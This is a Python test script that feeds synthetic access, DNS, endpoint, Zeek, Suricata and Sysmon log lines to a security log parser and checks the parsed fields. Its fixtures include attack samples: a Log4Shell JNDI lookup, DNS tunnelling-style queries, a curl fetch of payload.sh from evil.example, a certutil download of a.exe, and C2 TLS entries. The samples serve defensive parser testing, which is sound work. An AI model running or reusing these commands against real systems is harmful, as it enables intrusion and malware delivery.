from __future__ import annotations

import json
import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.parser.log_parser import parse_access_log, parse_dns_log, parse_endpoint_log, parse_suricata_eve, parse_zeek_log


def main() -> None:
    tmp = PROJECT_ROOT / "data" / "tmp"
    tmp.mkdir(parents=True, exist_ok=True)

    access = tmp / "access.log"
    access.write_text(
        '10.10.10.5 - - [27/Jun/2026:06:40:00 +0000] "GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1" 200 2 "-" "curl/8.0"\n',
        encoding="utf-8",
    )
    access_events = parse_access_log(access)
    assert len(access_events) == 1
    assert access_events[0].method == "GET"
    assert access_events[0].status_code == 200
    assert access_events[0].src_ip == "10.10.10.5"

    dns = tmp / "dns.jsonl"
    dns.write_text(
        json.dumps(
            {
                "timestamp": "2026-06-27T06:40:30Z",
                "src_ip": "10.10.10.20",
                "dst_ip": "8.8.8.8",
                "query": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.example",
                "qtype": "TXT",
            }
        )
        + "\n",
        encoding="utf-8",
    )
    dns_events = parse_dns_log(dns)
    assert len(dns_events) == 1
    assert dns_events[0].protocol == "DNS"
    assert dns_events[0].dns_qtype == "TXT"

    endpoint = tmp / "endpoint.csv"
    endpoint.write_text(
        "timestamp,host,process_name,command_line,dst_ip,dst_port\n"
        '2026-06-27T06:40:20Z,victim,bash,"bash -c whoami; curl http://evil.example/payload.sh -o /tmp/payload.sh",203.0.113.50,8080\n',
        encoding="utf-8",
    )
    endpoint_events = parse_endpoint_log(endpoint)
    assert len(endpoint_events) == 1
    assert endpoint_events[0].protocol == "ENDPOINT"
    assert "whoami" in endpoint_events[0].payload_clean
    assert endpoint_events[0].dst_port == 8080

    zeek_dns = tmp / "dns_zeek.log"
    zeek_dns.write_text(
        "#separator \\x09\n"
        "#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tproto\tquery\tqtype_name\n"
        "1782542500.0\tC1\t10.10.10.20\t5353\t8.8.8.8\t53\tudp\tbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.evil.example\tTXT\n",
        encoding="utf-8",
    )
    zeek_events = parse_dns_log(zeek_dns)
    assert len(zeek_events) == 1
    assert zeek_events[0].src_ip == "10.10.10.20"
    assert zeek_events[0].dns_qtype == "TXT"

    zeek_http = tmp / "http.log"
    zeek_http.write_text(
        "#separator \\x09\n"
        "#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tmethod\thost\turi\tuser_agent\tstatus_code\n"
        "1782542501.0\tC2\t10.10.10.5\t44444\t10.10.10.10\t80\tGET\tvictim\t/?x=${jndi:ldap://evil/a}\tcurl/8.0\t404\n",
        encoding="utf-8",
    )
    zeek_http_events = parse_zeek_log(zeek_http)
    assert len(zeek_http_events) == 1
    assert zeek_http_events[0].protocol == "HTTP"
    assert zeek_http_events[0].uri.startswith("/?x=")

    zeek_conn = tmp / "conn.log"
    zeek_conn.write_text(
        "#separator \\x09\n"
        "#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tproto\tservice\tconn_state\torig_bytes\tresp_bytes\n"
        "1782542502.0\tC3\t10.10.10.5\t44445\t198.51.100.20\t443\ttcp\tssl\tS1\t123\t456\n",
        encoding="utf-8",
    )
    zeek_conn_events = parse_zeek_log(zeek_conn)
    assert len(zeek_conn_events) == 1
    assert zeek_conn_events[0].protocol == "TCP"
    assert "service=ssl" in zeek_conn_events[0].summary

    zeek_ssl = tmp / "ssl.log"
    zeek_ssl.write_text(
        "#separator \\x09\n"
        "#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tserver_name\tsubject\tissuer\n"
        "1782542503.0\tC4\t10.10.10.5\t44446\t198.51.100.21\t443\tc2.example\tCN=c2\tCN=test-ca\n",
        encoding="utf-8",
    )
    zeek_ssl_events = parse_zeek_log(zeek_ssl)
    assert len(zeek_ssl_events) == 1
    assert zeek_ssl_events[0].protocol == "TLS"
    assert "c2.example" in zeek_ssl_events[0].summary

    suricata = tmp / "suricata_dns.jsonl"
    suricata.write_text(
        json.dumps(
            {
                "timestamp": "2026-06-27T06:40:31Z",
                "event_type": "dns",
                "src_ip": "10.10.10.20",
                "dest_ip": "8.8.4.4",
                "dns": {"rrname": "cccccccccccccccccccccccccccccccc.evil.example", "rrtype": "TXT"},
            }
        )
        + "\n",
        encoding="utf-8",
    )
    suricata_events = parse_dns_log(suricata)
    assert len(suricata_events) == 1
    assert suricata_events[0].dns_query.startswith("cccc")

    eve = tmp / "eve.jsonl"
    eve.write_text(
        "\n".join(
            [
                json.dumps(
                    {
                        "timestamp": "2026-06-27T06:40:32Z",
                        "event_type": "alert",
                        "src_ip": "10.10.10.5",
                        "src_port": 44444,
                        "dest_ip": "198.51.100.30",
                        "dest_port": 80,
                        "proto": "TCP",
                        "alert": {"signature": "ET WEB_SERVER Possible Exploit", "category": "Attempted Administrator Privilege Gain", "severity": 1},
                    }
                ),
                json.dumps(
                    {
                        "timestamp": "2026-06-27T06:40:33Z",
                        "event_type": "tls",
                        "src_ip": "10.10.10.5",
                        "src_port": 44445,
                        "dest_ip": "198.51.100.31",
                        "dest_port": 443,
                        "proto": "TCP",
                        "app_proto": "tls",
                        "tls": {"sni": "c2.example", "ja3": "abcd"},
                    }
                ),
                json.dumps(
                    {
                        "timestamp": "2026-06-27T06:40:34Z",
                        "event_type": "flow",
                        "src_ip": "10.10.10.5",
                        "src_port": 44446,
                        "dest_ip": "198.51.100.32",
                        "dest_port": 8080,
                        "proto": "TCP",
                        "app_proto": "http",
                        "flow": {"bytes_toserver": 321, "bytes_toclient": 123},
                    }
                ),
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    eve_events = parse_suricata_eve(eve)
    assert [event.protocol for event in eve_events] == ["SURICATA_ALERT", "TLS", "TCP"]
    assert "Possible Exploit" in eve_events[0].summary
    assert "c2.example" in eve_events[1].summary
    assert eve_events[2].raw_size == 321

    sysmon = tmp / "sysmon.jsonl"
    sysmon.write_text(
        json.dumps(
            {
                "UtcTime": "2026-06-27T06:40:20Z",
                "EventID": 1,
                "Computer": "victim",
                "EventData": {
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine": "powershell -c whoami; certutil -urlcache -f http://203.0.113.60/a.exe a.exe",
                    "DestinationIp": "203.0.113.60",
                    "DestinationPort": "8081",
                },
            }
        )
        + "\n",
        encoding="utf-8",
    )
    sysmon_events = parse_endpoint_log(sysmon)
    assert len(sysmon_events) == 1
    assert "certutil" in sysmon_events[0].payload_clean
    assert sysmon_events[0].dst_ip == "203.0.113.60"


if __name__ == "__main__":
    main()
